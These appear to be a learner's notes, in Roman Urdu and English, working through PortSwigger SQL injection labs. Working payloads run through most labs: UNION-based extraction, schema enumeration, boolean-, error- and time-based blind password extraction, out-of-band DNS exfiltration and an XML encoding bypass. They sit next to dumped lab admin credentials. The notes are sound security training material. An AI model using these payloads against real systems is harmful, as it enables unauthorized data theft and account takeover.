Lab: SQL injection UNION attack, determining the number of columns returned by the query

-> Find number of columns 
1) Columns must be same in all queries
2) Data types must be comaptible

STEP 1 ->
SELECT ? from table1 UNION SELECT NULL -> Agar galat col ke barabar select kr lia to error a jai ga else agar sahi kia to 200 response a jai ga means correct

STEP 2 ->

SELECT a, b from table1 order by 3

So sab se pehle click kia tech gifts waha category = techgifts aya use mitaya and category=' to internal server error aya means it is vuln to sql injection

Then '-- yeh kia take error na ai or 200 response aya to page par '-- likha a gya

Ab determine krein ge columns

'UNION select NUll--  ----> krein ge query ese the

SELECT * FROM products WHERE category = '$category';

neeche dekho kese ban gai


SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL--';

'UNION select NUll-- -> to is ke baad internal server error a jai ga cz column ham sirf aik le rhy yaha, ho sakta 3 coulmns ho like this SELECT id, name, price FROM products WHERE category = 'Gifts';

Us ne to burp se kia waaha jaha get request the wala columns khud bhara bhara ke kie Null,+Null,+Null -- is trha to 3 aya ot lab solve ho gai ab 2nd tareke se krein ge, order by wale se

yeh query likhe us ne, null ko bharate gai jaha response 200 aya wo theek tha

GET /filter?category=Gifts'UNION+select+NULL,+NULL,+NULL --


Now Order By ->

Is ko url me kar rhy  ?category = Gifts' ORDER BY 1 --; 
To error nhi ai ga till order by 3 tak lakin 4 krein ge to internal server error cz koi hai he nhi column 4 







Lab #4 SQL injection UNION attack, finding a column containing text ->


Analysis

' order by 1-- -> kro check kro pehle to url me category=Gifts' order by 1-- me ja ke ke kya scene? jab tak internal server error nhi ata check krte jao 

so Tech gifts me gya 3 columns ha us me

ab data type check krne so -> ' UNION select 'a', NULL, NULL-- es trha kia to pehla coulmn nhi tha string data type ka phir 2nd check kia
 
' UNION select NULL, 'a', NULL--  --> To yeh chal jai ga cz 2nd column ke data type string hai, then 3rd ko check kru ga, and screen pr a likha a rha yani yeh column data dikha rha

' UNION select NULL, 'a', 'a'--  yeh error de de ga to 1st and 3rd columns are not of type string

to ab hamein unho ne kaha ke aap screen pr KsZXy4 dikhao, to wo kese nazar ai ga agr ' UNION select NULL, 'KsZXy4', NULL-- yeh kr dein 


Lab 6 ----------->>>>>
SQL injection UNION attack, retrieving multiple values in a single column

' ORDER BY 2--     => kia to sahi rha ab ham check krein ge ke type kon se

' UNION SELECT NULL, 'a'--     => 2nd wala column show ho rha ab hemin password and username ko aik he column me dikhaana, ham yeh kaam 2 queries likh ke bhe kr sakte like 
' UNION SELECT NULL, username from users--
' UNION SELECT NULL, password from users--

lakin hamein aik he query me krna ---> way to do that is concatenation, lakin us ka tareka har db ke lie alag hai is lie pehle db ka version nikaal lete

' UNION SELECT NULL, version()--
PostgreSQL 12.22 -> postgres use kr rhay ab concatenation ka bhe postgres se he krna, 'foo'||'bar' yeh tareka

' UNION SELECT NULL, username|| '*' || password from users--

-> Wo hata dena '' uper se username and password me 






LAB -> 7
SQL injection attack, querying the database type and version on Oracle

-> End goal is to display database version string

-> So sab se pehle number of coulmns find kro, lakin jis category me me hu rn pata chal rha ke 2 columns dekh ke pata chal jata, lakin ho sakta or bhe ho jo ke visible na ho 
' order by 2 -- he hain lab 7 me

ab data type check krein ge 'Union select 'a' 
' UNION select 'a', 'a'--  --->  lakin oracle ke case me kaam nhi kre ge cz oracle kehta ke bhai kis table se lena ??? to ham use FROM dual likhte ke yeh dummy table hai dual is se fake table hai yeh dual koi or name nhi likhna unless ke real name nhi pata table ka to yeh scene 

' UNION select 'a', 'a' FROM dual-- 
yeh dono nazar a rhy neeche paragraph me aik dark aik light cz col 1 heading ha and col 2 description

3rd step -> Version of database output krna, to har kisi ka diff tareka yeh aap search bhe kr sakte ke kis tareke se krna abhi oracle hai

SELECT banner FROM v$version    -> This is the way banner likha rehne do, null ke jaga kuch or kr sakte the agar show hota 2nd column bhe jo ke hota ha, lakin hamara kaam version ke he ha bs 
in our case now -> ' UNION SELECT banner, NULL FROM v$version-- 


MERA SAWAL TABLE NAME KESE NIKALNE ??? Information schema se ig






------> SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft

Goal -> Display database version

Analysis -> 2 columns hain is me ' ORDER BY 2-- lakin is lab me comment  yeh wala krna #.


Now check which columns contain text -> 'UNION SELECT 'a', 'a'# -> Dono aik sath ham nhi krte like aik ko null rakhte lakin waha pata chal rha ke dono text he ho ge




Lab 9 -> 
SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases

End goal -> Determine the table that contains username and passwords
-> Determine the relevant columns
-> Output the content of the table
-> Login as admin user

Is lab me pechle labs ke trha columns name nhi die hoye hamein khud dhonde to yeh realistic ho jaye ga thora bohot 

Analysis ->  Sab se pehle ' dala to error aya means vulnerable ha

-> Find the number of columns -> 2 hain 
-> Data type -> ' UNION SELECT 'a', 'a'--  ---> Hamein nazar a rha dono text hain to is lie esa kr dia, warna first ko null rakh lete and viceversa

-> Ab content nikalne se pehle database me se hamein pata hona chaye kon se database ke sath deal kr rhy, cz query jo use krne wo har database ke lie diff ha

' UNION SELECT @@version, NULL--  -> Not microsoft
' UNION SELECT version(), NULL--  -> Postgres pe aya 200 

-> Next step output the list of table names in the database
So ab yeh postgres hai is ke lie tables ke name ke query 
SELECT * FROM information_schema.tables -> So ye query likhe ge ' UNION SELECT table_name, NULL FROM information_schema.tables--       --->>>
table_name = column name hai
Jo information_schema.tables me hota hai, aur table ke naam rakhta hai

Aur output visible ho,
toh us database ke jitne bhi tables honge, sab ke names dikh jayenge ✅ Ye poore server ke jitne bhi databases hain, un sab ke table names show karegi.



📌 Aur agar tu sirf current database ke tables chahta hai:
UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()--
Isme database() ka matlab hai → current database ka naam

Agar tu kisi ek table (e.g. users) ke columns dekhna chahe to ------>

UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--



users_xmylmh -> Suppose yeh table ho ga jis me username and password ho ga cz user se name shuru ho rha, cmd+f kr ke nikla yeh jo itne zayada table ai un me se 
-> Ab is ke columns check krne ke lie yeh 
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_bjhovt'--

And remember yeh sab postgres ke queries hain


to users_bjhovt -> 
password_gobsee
email
username_pxsaeo 3 columns mile lakin hamein to error a rha tha order by 3 pr
ORDER BY 1--, ORDER BY 2--, ORDER BY 3--
ye backend ke SELECT statement ke result columns pe apply hota hai — na ke table ke columns pe. Table me columns 100 ho sakte hain — ORDER BY unhi columns pe chalega jo SELECT me aay rahe hain. So yeh waja khair ab hamare paas table name columns name containing username column and password column ab hamein info retrieve krne

-> ' UNION SELECT users_bjhovt, password_gobsee from users_bjhovt--

-> ' UNION SELECT username_exktzk, password_jdbbno from users_mrdzci--

So unho ne kaha aap ne as admin login krna to username and password a jai ga to dekh lena ho gya tha



LAB -> 10
SQL Injection - Lab #10 SQL injection attack, listing the database contents on Oracle, uper wale non oracle database ha, yeh oracle hai baki same hai

Goal -> Determine which table contains username and passwords
-> Determine the column names in table
-> Output the content of the table
-> Login as the admin user 

Analysis -> ' lagao error aya to sqli possible
-> 2 columns hain is me -> ' order by 2--
-> Data types check -> ' UNION SELECT 'a', 'a' from DUAL-- so oracle hai hamein from clause use krna parta warna nhi chalte query

-> Database oracle hai hamein pata hai, ab 3rd step output table in the database

' UNION SELECT table_name, NULL from all_tables--
-> tables nikal ai ab users chaye jo hain database me, ab users cmd+f se dekhin ge wo jis me users likha ho cz users me he password and usernames hote
-> USERS_MWMGEY

now column names ko output krna is table ke 
' UNION SELECT column, NULL FROM all_tabs_columns WHERE table_name='USERS_MWMGEY'--

ab ->
In Oracle, system views like ALL_TAB_COLUMNS, DBA_TAB_COLUMNS, and USER_TAB_COLUMNS are built-in data dictionary views. These views have predefined column names — they are not magic keywords; they’re just the names Oracle uses to store metadata about your tables and columns.

So, in ALL_TAB_COLUMNS:

The name of the column that stores the name of each table column is COLUMN_NAME.

There is no column called COLUMN.
yani column ke jaga column_ame ai ga  why ->
💡 1 line mein:
COLUMN_NAME Oracle ka predefined naam hai jo “column ka naam” store karta hai. Tumhe wahi use karna padega.

COLUMN_NAME ek column hai system table mein — iske andar tumhare real table ke column ke naam likhe hote hain.

Tum direct apne real table se nahi nikal sakte ki kaunse columns bane hain — uske liye Oracle ne ye meta data views diye hain.


' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_MWMGEY'--

USERNAME_LUJBVX
PASSWORD_MUQDSJ

-> Next step to output usernames and passwords
' UNION SELECT USERNAME_LUJBVX, PASSWORD_MUQDSJ FROM USERS_MWMGEY--
administrator
kaocvup6sawiv78zm1ie






LAB -> 11 ->>

SQL Injection - Lab #11 Blind SQL injection with conditional responses

Normal SQLi mein tumhe direct output milta hai (e.g., table dump ho jata hai).

Blind SQLi mein tumhe direct output nahi milta, sirf page ka behavior change hota hai.

Tumhe server ke TRUE/FALSE ya TIME DELAY se pata karna padta hai.

So kuch return nhi hona na sql query na errors so no union based sql injection but app welcome back msg return krte hai in page agar query returns any rows, so the query that takes any cookie returns any rows then welcome msg else no

vuln parameter = tracking cookie
end doals -> enumerate the password of adminstrator
-> login as administrator

Analysis:

First thing for blind sqli is to force a true use case and see how the app responds and then force a false use case see how to app responds, if the app responds differently depending on the true use case versus the fasle use case then u can exploit blind sqli

-> So confirm that parameter is vuln to blind sqli  -> So is ke lie query ko imagine krna pare ga how it looks at the backend

select tracking-id from tracking-table where trackingId = 'ONfTM0JrkFEJ1eYR' -> Yeh me ne inspect kr ke apni tracking id le ab yeh query kuch ese he ho ge lakin name change ho sakte acha ab scene kya ha, so aga ryeh tracking id already exist krte hoye database me cz ham ne visit kia, so agar tracking id exist kre to query will return value -> welcome back but agar nhi ata to matlab query return nothing cz trackind id doesnt exist

ab check rkne ke lie select tracking-id from tracking-table where trackingId = 'ONfTM0JrkFEJ1eYR' and 1=1--'      yani ' and 1=1--' add kia to agar true hua to jo ke hamein pata tracking id bhe yeh hai hamare and 1=1 he hota to hamein true mile ga welcome back ai ga

ONfTM0JrkFEJ1eYR' AND 1=1-- so yeh me ne network tab me chalta and reload kia welcome back a gya 

ONfTM0JrkFEJ1eYR' AND 1=2-- so yeh me ne network tab me chalta and reload kia welcome back nhi aya is case me

So hamein pata chal gya app ne diff behve kia on true vs false question -> Ab is ka faida kya? So ab faida yeh hai ke ham pooch sakte application se ke user table exist krta ke nhi, agar welcome back msg aya to matlab exists krta else no

session id yeh hai btw -> 47BongTRY4QFYquK5uLaLXztQ8laEHM1


select tracking-id from tracking-table where trackingId = 'ONfTM0JrkFEJ1eYR' and (select 'x' from users LIMIT 1)='x'--'

likhna yeh hai query ke cookie ke aage ->
' and (select 'x' from users LIMIT 1)='x'--'  => welcome back aya yani table exists krta
===> ab pata krna ke username administrator esists in users table 



------>>> Agar na die hote tables name like username and password tab kese pata krte, tab users table username and password us ke 2 columns pehle dhoondne parte then administrator ka krte, karna shayd ese he tha boolean yah time based se



Ye subquery users table mein jaake rows dekhti hai.
Agar kam se kam 1 row hai, toh woh row milegi aur tumhara 'x' return ho jayega.
Agar table empty hai → kuch return nahi hoga (NULL).
Agar 'x' mila → 'x' = 'x' → TRUE
Agar NULL mila → NULL = 'x' → FALSE

to limit 1 lagana zarrui ha
Agar users table mein sirf 1 row hai → koi issue nahi. Ek 'x' return hoga → 'x' = 'x' TRUE ho jayega.

Lekin agar users table mein 1 se zyada rows hain, toh subquery multiple 'x' return kar degi:

'x'
'x'
'x'

SQL mein (SELECT ...) ek scalar value (single value) hona chahiye agar tum usko compare kar rahe ho:
... = 'x'
ERROR: more than one row returned by a subquery used as an expression

jo trackingid ke aage (select 'x' from users LIMIT 1)='x'--'   yeh likha ONfTM0JrkFEJ1eYR' and (select 'x' from users LIMIT 1)='x'--'  to welcome back aya yani table hai user ka 

Yeh sawal dubara dekh lo portswigger ka unho ne names abhi die hoye ->
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.



Now -> username administrator exist krta user table me?
ONfTM0JrkFEJ1eYR' and (select username from users where username='administrator')='administrator'--'
so agar exist kre ga to welcome a jai ga and agar nhi kre ga to nhi ai ga welcome

LAKIN ab game ai ge password me masla hai hamein kuch nhi pata kitne characters ka hai pehle to wo dekhna then password dhoonda yeh sara brute force ha, means pehle length nikaal ke and then password us ke baad ham login kr dein ge cz username pata us ke baad password a jaye ga then login

to find length -> ONfTM0JrkFEJ1eYR' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'
Agar true hua to matlab 1 se greater hai cz administrator word to hai wo ham ne uper dekh lia 

So welcomeback a gya 1 pe ab me 20 check kr rha, yah sniper se bhe kr sakte brute force

To 1 se 50 start attack kia sniper se or attack numbers rakha, ab jaha length change ho rhy 19 pe us ke baad welcome back nhi a rha 
url copy kr ke bhe dekh sakte ke welcome back a raha ke nhi
yani =>19 hai or >20

ab password dehna kya hai brute force he krein ge

ONfTM0JrkFEJ1eYR' and (select substring(password, 1, 1) from users where username='administrator')='a'--'

so welcome back nhi mila means first character is not a

intruder se sniper kia attack type bruteforcer rakhe min and max length = 1 ke and 4 pe welcome back a rha like 1st char 4 hai, select substring(password, 1, 1) is line ke game hai is ko zara samjho pehle


🔑 substring( text, start, length )
text = Kaunsi string se nikaalna hai? → yahan password

start = Kaunse position se shuru karna hai? → yahan 1

length = Kitne letters nikaalne hain? → yahan 1

⚡ Real Example
Agar password = 'admin123' hai:

a	d	m	i	n	1	2	3
1	2	3	4	5	6	7	8

substring(password, 1, 1) → 'a'

substring(password, 2, 1) → 'd'

substring(password, 1, 3) → 'adm'

ab bare password jo ham nikaal rhy the intruder se, ab agar yeh sniper se krein ge to 20 dafa krna pare ga, lakin cluster bomb se krin ge ham







LAB => 12 
SQL Injection - Lab #12 Blind SQL injection with conditional errors

-> Vulnerable -> tracking cookie
End goals -> output -> Administrator password
login as admin user

' || (select '') || ';  -> To yeh tracking id ke aage likh ke check kia, to yeh 500 error aya cz ham shayad oracle database use kr rhy the to us me from lagana hota to neehe wala jab likha to kaam ban gya

' || (select '' from dual) || ';

-> Ab ham confirm krein ge user table exist krta db me ke nhi ' || (select '' from users) || '; -> agar users table ho ga to error nhi ai ga agar na hua to error ai ga

' || (select '' from users where rownum=1) ||' -> Yeh query likhe, cz agar 5 entries hoye to 5 rows return ho jaye ge query break ho jaye ge so rownum=1 kr dia to sahi ai ga

-> next step check kro administrator exist krta users table me

-> ' || (select '' from users where username='administrator') ||' ---> Yeh agar to hua to 200 reponse ai ga agar na hua to wo select protion chala de ga to hamein pata nhi chale ga kya scene, error bhe nhi de ga to dono cases me reponse 200 he ai ga so we are not going to use this, be smarter, to ham case expression use krein ge 

' || (select CASE WHEN(1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'  -> is case me yeh 1=0 pe jai ga false ho ge to ELSE ''pe chala jai ga so error nhi ai ga lakin agar 1=1 krte to then to char 1/0 pe chale jate to error a jata

' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||' 
is pe kya ho ga => pehle from wale line run ho ge pehle wo check kre ga admin exist krta db me ke nhi? Agar krta to select statement chale ga and agar na kia exist to select portion perform nhi ho ga to agar exist kia to select chale ga 1=1 ho ga and 1/0 chal jai ga jis se error a jaye ga pata chal jai ga exist krta db me, agar administratorrr likh do ge to nih mile ga to 200 ok ai ga cz error aya he ni


Ab password nikalo -> Sab se pehle length nikaloo ->

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1)) || '  -> Password ke length agar 1 se zayda ho ge to 1=1 chale ga and 1/0 ke waja se error a jai ga lakin agar pass ke length > 50 kr deta to uper wale statement run he nhi ho ge and error nhi ai ga, to yeh tareka hai pata lagane ka  

uper wala nhi chal rha ye chal rha, neeche wale chal rhy sahi
' || (SELECT CASE WHEN (LENGTH(password) > 30) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' 

🗝️ Step by step:
1️⃣ Yeh payload kis cheez mein ja raha hai?

Tum input de rahe ho (jaise Cookie ya URL param) jo SQL query ke andar add ho raha hai.

' || (...) || ' syntax ka matlab hota hai string concat → injection ho gaya.

2️⃣ Kya ho raha hai iske andar?

(SELECT CASE WHEN (...)) — ek subquery run ho rahi hai.

3️⃣ CASE WHEN kya kar raha hai?

WHEN (LENGTH(password) > 30) — users table me administrator ka password check karo: kya length 30 se badi hai?

4️⃣ Agar condition TRUE ho gayi:

THEN TO_CHAR(1/0) ➜ 1/0 ➜ divide by zero ➜ SQL error ➜ server dega 500 Internal Server Error.

Tumhe pata chal gaya: Haan bhai length 30 se zyada hai.

5️⃣ Agar condition FALSE hui:

ELSE '' ➜ blank string ➜ query safely complete ➜ 200 OK ➜ pata chal gaya: password 30 se chhota ya barabar hai.

⚡ Status code kya bata raha hai?
Response	Matlab
500 Error	Condition TRUE ➜ guess sahi ➜ length > 30
200 OK	Condition FALSE ➜ guess galat ➜ length ≤ 30

✅ Why it works:
Server ke error ka side effect tum exploit kar rahe ho.

CASE WHEN safe hai: koi match nahi to '' return ➜ no error.

True hone pe forcefully 1/0 ➜ force error ➜ status code se signal mil gaya.

Agar tumhara response 500 aaye ➜ condition TRUE ➜ password > 30.

Agar response 200 aaye ➜ condition FALSE ➜ password ≤ 30.



🔑 1️⃣ Kya fark hai UNION SELECT aur '|| SELECT ... || ' mein?
| 🔍 | UNION SELECT | '|| SELECT ... || ' |
|------|---------------------|-----------------------------|
| Use-case | Nayi rows ya columns output mein laane ke liye | Ek string mein chhupa ke query ghusane ke liye |
| Kis mein hota hai? | WHERE ya ORDER BY clause mein direct | Mostly WHERE mein jab input ek string hai |
| Syntax | 'abc' UNION SELECT ... -- | 'abc' || (SELECT ...) || ' |

🔑 2️⃣ '|| kab lagana padta hai?
Jab server query WHERE field = 'INPUT' bana raha hai

Tumhara input string literal ke andar ghus raha hai

Tum direct UNION nahi laga sakte warna syntax error hoga

Toh tum keh rahe ho: "Meri string ka ek hissa normal ho, ek subquery ho"

➡ '|| = string concat operator

🔑 3️⃣ Example:
Imagine:

SELECT tracking_id FROM sessions WHERE tracking_id = '$COOKIE'
✅ Normal cookie:

TrackingId=wZ18fCG9kHsmE7ow
➡ Server banata:


WHERE tracking_id = 'wZ18fCG9kHsmE7ow'
✅ Tum payload dalte ho:


TrackingId=wZ18fCG9kHsmE7ow'||(SELECT CASE WHEN (LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
➡ Final query:


WHERE tracking_id = 'wZ18fCG9kHsmE7ow' || (SELECT CASE ...) || ''
'|| ... || ' se:

Pehla part: original tracking ID

Beech mein: tumhara subquery

End: string close

Server final string banata hai → agar condition true → error throw ho → tumhe pata chal jaye!

🔑 4️⃣ UNION SELECT kaise hota?
Wahi input mein tum quote close karte aur UNION SELECT daalte:


TrackingId=wZ18fCG9kHsmE7ow' UNION SELECT version()--
Tab poori query ban jati:


WHERE tracking_id = 'wZ18fCG9kHsmE7ow'
UNION SELECT version() --'
Ismein '|| ki zarurat nahi.

✅ Bottom line:
✔️ '|| tab lagate ho jab tumhari subquery ek string literal ke andar ghus rahi ho.
✔️ UNION SELECT tab lagate ho jab tum direct new row ya result chahte ho.
✔️ Purpose: Same = injection, style: alag kyunki context alag.

🗣️ Senior style summary:
'|| = string jodne ka tarika.
UNION SELECT = query mein nayi line jodne ka tarika.

✅ Bas. Khatam.



agar string ke andar rhy or || yeh lagai begair query likhte to error ata ?
✅ **Bilkul — agar tum string literal ke andar ho aur || na lagao → query error degi!


✅ Kaam || kya karta hai?
|| bole: “Yeh string yahan khatam → ab naya expression jodo → phir string continue karo.”

Example:

sql
Copy
Edit
WHERE tracking_id = 'abc' || (SELECT ...) || ''
Bina ||:

sql
Copy
Edit
WHERE tracking_id = 'abc (SELECT ...) '
➜ Galat! Yeh sab kuch string ban jayega — SELECT execute nahi hoga.



now -> admin password -> neeche likha sahi payloads

' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

✔️ SUBSTR(password,1,1)='a'

Agar pehla char 'a' hai → THEN TO_CHAR(1/0) ➜ divide by zero ➜ 500 error

✔️ Agar pehla char 'a' nahi hai → ELSE '' ➜ khali string ➜ koi error nahi ➜ 200 OK



-> Ab agar pehla char (a) na hua to yeh else statement chalai ga and '' chale ga to error nhi ai ga 200 response ai ga lakin agar a hua to 1/0 ho jaye ga 500 ai ga

Pehla char a hai kya? Error → YES

Nahi → next letter.

Fir SUBSTR(password,2,1) for next character, aur aise hi.


CASE kabhi bhi tab nahi chalega jab FROM se row nahi mile.
Agar 500 error mil raha hai → iska matlab FROM se row mil rahi hai.
Bas — isme logic confuse mat kar.



password checking me -> Cookie: TrackingId=vrrSU85YZAf3dDR0'||(SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

aik letter ko wo 20 positions pe dhoond rha samjh ai? k 1 se 20 1st payload chal rha and letter aik he reh rha, kisi position pe bhe nhi agar to nhi hota hua to mil jaye ga 1 2 3 4 5 6 7 ... 20 check kre ga a ko


06kkwyriup859lig95td -> ab yeh password ghanta nikaal ke nikala and login nhi ho rha yeh 







Lab 13 -> 
SQL Injection - Lab #13 Blind SQL injection with time delays

✅ Boolean-based blind SQLi use nahi karte jab:
1️⃣ Response same ho, chahe condition true ya false ho.
2️⃣ Error ya output visible na ho.
3️⃣ Page ka structure ya size change na ho.
🔑 Tab Time-based blind ya Error-based try karte hain.


Vuln = Tracking cookie
Results return nhi ho rhy so no union based sql i and app differently bhe respond nhi krte based on weather the query return any rows or causes an error, we cant use any bilnd sql injection techniques, that we have used in previous labs

Analysis -> Time based sql injection use kr sakte 
-> Prove that field is vulnerable to blind sqli (time based)



-> So tracking id me inject krna so 10sec delay krna agar ho gya 10sec delay to time based blind sqli se vuln hai. Ab cheet sheet me ja ke har db ke alag hai, to ab ham fuzz krein ge cz hamein nhi pata kon see db use kr rhy 


mysql -> ' || (SELECT sleep(10))--    -> To sleep nhi hua hamein forun response a gya, so mysql nhi hai

postgres -> ' || (SELECT pg_sleep(10))--  ---> Worked and lab is solved


yeh wese he likha batane ke lie behind the scenes kya hota -> ham jo '|| krte wo yeh ha ' ||  and ho last me ham || ' krte  || ' wo yeh and jo sab se last me lage ' wo basically wZ18fCG9kHsmE7ow'  is ka ' yeh wala hai
WHERE tracking_id = 'wZ18fCG9kHsmE7ow' || (SELECT CASE ...) || ''



aik or major baat 

✅ WHERE clause (Blind) → tum string ke ANDAR ho, isliye || lagana padta hai taake string toot ke payload jure.
✅ UNION clause → tum string ke BAHAR ho, direct columns join karte ho, isliye || ki zarurat hi nahi.

to yaha andar hain ->
WHERE tracking_id = '[INPUT]' 

'abc' || (SELECT CASE WHEN (1=1) THEN 'True' ELSE 'False' END) || ''
 


LAB -> 14


SQL Injection - Lab #14 Blind SQL injection with time delays and information retrieval

Vuln = Tracking cookie
Results not returned -> NO UNION based
It doesnt behave differently weather query returns any rows or not -> SO NO BOOLEAN BASED BLIND SQLI

END GOALS ->
Exploit time based sqli to output the administrator password and then login as administrator

ANALYSIS -> Parameter is vuln to sql injection
' || (select pg_sleep(10))--  ---> To vuln hai pehle yeh cheez check  yeh likh ke 
like this -> Cookie: TrackingId=6tNEfi7gaRvZfH5y' || (select pg_sleep(10))--;

-> now confirm user table exists krta ke nhi? To app se pochein ge agar krta to sleep 10 sec agar nhi to na karna
to previous labs ke trha he krin ge

' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--; -----> Yeh checking ke lie hai ke agar to 1=1 to pg sleep 10 agar nhi to -1 wese he dikhane ke lie kia actual query neeche hai

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users) --; 

So ho kya rha uper ke from users aik condition hai ke users hain and us ke baad username=admin check kre ga wo agar hua to true ho ga and 10sec sleep mil jai ge else -2 sec, so ai ga 200 ka response 10 sec baad, now length of the password

' || (select case when (username='administrator' and LENGTH(password)>19) then pg_sleep(10) else pg_sleep(-1) end from users) --; ----> Ho gya yeh 10 sec sleep kre ga, so it means length exist and administrator exists, so password ke length agar 20 krta to -1 chalta

LENGTH(password)>19) -> It means lenght of password greater then 19 hai to jab >20 krte to matlab length of password greater then 20 means 21 21 and so on lakin agar false hua >20 wala and >19 wala true to matlab 19 se bhara hai lakin 20 se bhara nhi to matlab value 20 hai


AB PASSWORD NIKALEIN GE ->

' || (select case when (username='administrator' and substring(password, 1, 1)='a') then pg_sleep(10) else pg_sleep(-1) end from users) --;  ----> To response forun a jai ga means ke a nhi 1st char, ab ham yaha par intruder use krein ge 

ab mujhe beht kr observe krna pare ga to ro edition me response receive ke aik column hai jo mere paas nhi, ab me kya kru, is lie me password nhi nikaal sakta itna time nhi, mujhe beht ke reponse dekhna pare ga cz is case me page change nhi ho ga na error ai ga reponse ke game ha sare




lab -> 15
SQL Injection - Lab #15 Blind SQL injection with out-of-band interaction

vuln parameter => Trackig cookie
If app is vuln and we attack the app, still we cant useful response from app, out of band sql injection use krein ge take pata chale ke attack successful hua ke nhi, out of band ko trigger krna  means u send and attack payload that causes an interaction with external system
that u have full control of, and since u have full control of this system when u run your attack, we can see the response u triggered, therefore you know u have successfully exploited sql injection

-> Burp collaborator

-> successfully exploit kar lia sql injetion ko hamein tab pata chale ga jab ham burp collaborator par dns lookup krein ge

yeh kaam burp community wale pe nhi hona

End goal -> Exploit sql injection and cause a dns lookup

Analysis ->  ab burp ke he tab me collaborator pakra,us me link aya wo copy kia 
hvhebhvbrhvbhwrbvhrwbvbrvrbvh.burpcollaborator.net 
yeh aya or yh hamara client yah external system hai jo ke dns lookup to kre ga

xml eternal entities






Lab #16 Blind SQL injection with out of band data exfiltration ------->


Vuln parameter ---> Tracking Cookie

End Goals ---> Exploit sqli to output the password of administrator
---> Login as administrator user

---> Kaam uper wale ke trha he ho ga collaborator se link banaya and jo query hai me shayad na likhu lakin query me wo domain yah link dia, to scene sun lo ab pehle wale uper wale sawal me out of band injection with out of band data tha to us ke payload ke neeche ab  Blind SQL injection with out of band data exfiltration hai kuch bhe nhi krna, uper wale yani kal out of band wale lab ka cheet sheet the DNS LOOKUP and ab is ke hai DNS LOOKUP with DATA exFiltration, query ok bs change krna ' || yeh kr ke brackets laga ke () and select password from users where username='administrator' and link paste krna server ka 
Bs phir burp me kr do and dns collaborator me nazar a jai ga and login kr lena baad me


Lab -> 17

Lab #17 SQL injection with filter bypass via XML encoding

EndGoal -> Exploit sql injection to retrieve the admin user's credentials from the users table and log into their account.

XML encoding likha hua kya hote, notes me ------->>>
Analysis: Yar sab se pehle http histor se view details kar ke picture me wo wale request pakarne jis me GET /product?productId=11 HTTP/2 kuch is trha ho --->

and uske baad nece check stocks check krein ge to us ke baad aik or request ho ge jo post ho ge wo pakrne, yeh neeche 2 chezein likhe ke ho ge un me 

POST /product/stock HTTP/2

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>11</productId><storeId>1</storeId></stockCheck>


So, agar yeh query paramtereized na hoye to ham ise exploit kr sakte and db se content nikaal skte


1 UNION SELECT NULL -> Then is ko encode kia hex entitites me then aik or null lagaya aage to is baar cz yeh query chal rhy the 0 a gya qunatities so matlab ke payload kaam kr raha, 1 pehle ka likha tha stock id me ham ne union select null add kia
ab unho ne kaha password nikalo and username to column to aik hai to concatenate krein ge and then admin login

<storeId><@hex_entities>1 UNION SELECT username || '-' || password from users</@hex_entities></storeId>

yeh query -> UNION SELECT username || '-' || password from users

yeh uper stor id ke andar likha jo likha, jo extension use ke the hackvertor us ke waja se is me script nhi kr sakte


IS SAWAL KE EXPLANATION OR YEH SARA XL KE BARE ME NOTES ME HA


Lab -> 18
Lab: Visible error-based SQL injection












Lab -> 8

SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft

Vuln -> Product category 
End goal -> Display db version

Analysis -> Find number of columns -> IS me accessories
' ORDER BY 1--

-> Find kidhr string ha

' UNION SELECT 'a','a'--

Now database version

' UNION SELECT NULL, @@version# -> Comments yeh wala dalna 




LAB 9->

SQL injection UNION attack, determining the number of columns returned by the query

vuln => product category
=> Find number of columns
' ORDER BY 3-- ---> hain yani 3 columns 4 pe error a rha

' UNION SELECT NULL,'a',NULL--    -> Sirf 2nd column nazar a rha




Lab -> 5
SQL injection UNION attack, retrieving data from other tables

' ORDER BY 2--  --> Tak chal rha

-> Next step data type
' UNION SELECT NULL, NULL--  ===> Dono string data type 'a', 'a'

' UNION SELECT username, password from users--  ---> kis to a gya result.
then login
administrator
qray6usselyc7ubpejqd